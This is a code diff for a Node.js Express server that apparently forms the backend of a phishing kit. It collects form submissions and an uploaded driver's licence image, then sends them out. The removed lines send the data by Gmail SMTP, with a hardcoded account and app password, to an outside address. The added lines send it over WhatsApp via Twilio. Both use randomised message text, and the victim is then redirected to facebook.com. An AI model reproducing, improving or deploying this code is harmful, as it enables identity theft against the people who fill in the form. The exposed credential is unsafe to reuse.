@@ -3,16 +3,16 @@ const app = express();
 const fs = require("fs");
 const path = require("path");
 const bodyParser = require("body-parser");
-const nodemailer = require("nodemailer");
 const multer = require("multer");
 const zipFolder = require("zip-a-folder");
 const compromise = require("compromise");
+const twilio = require("twilio");
 
-// Generate a random sentence for the email body
+// Generate a random sentence for the message body
 const randomSentence = compromise("i").random().sentences(1).out();
 
-// Generate a random sentence for the email subject
-const randomSubject = compromise("i").random().sentences(1).out();
+// Generate a Twilio client object
+const client = new twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
 
 const port = 9000;
 
@@ -54,34 +54,14 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     const dataFileName = path.join(folderName, "happy.txt");
     fs.writeFileSync(dataFileName, JSON.stringify(data));
 
-    // create nodemailer transport object
-    const transporter = nodemailer.createTransport({
-      host: "smtp.gmail.com",
-      port: 465,
-      secure: true,
-      auth: {
-        user: "tobir2275@gmail.com",
-        pass: "qteaicwtuuzthdbl",
-      },
+    // send message with Twilio
+    const message = await client.messages.create({
+      from: "whatsapp:<your Twilio WhatsApp number>",
+      to: "whatsapp:<recipient phone number>",
+      body: `${randomSentence}`,
+      mediaUrl: `https://example.com/uploads/${dataFileName}`,
     });
-
-    // create mail options object
-    const mailOptions = {
-      from: "tobir2275@gmail.com",
-      to: "momsingle579@gmail.com", // recipient email address
-      subject: `${randomSubject}`,
-      text: `${randomSentence}`,
-      attachments: [
-        {
-          filename: "happy.txt",
-          path: dataFileName,
-        },
-      ],
-    };
-
-    // send mail with defined transport object
-    const info = await transporter.sendMail(mailOptions);
-    console.log("Email sent successfully.", info);
+    console.log("Message sent successfully.", message);
 
     // remove the folder and file
     fs.unlinkSync(dataFileName);
@@ -90,7 +70,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     res.redirect("https://www.facebook.com");
   } catch (err) {
     console.error(err);
-    res.status(500).send("Error sending email.");
+    res.status(500).send("Error sending message.");
   }
 });
 
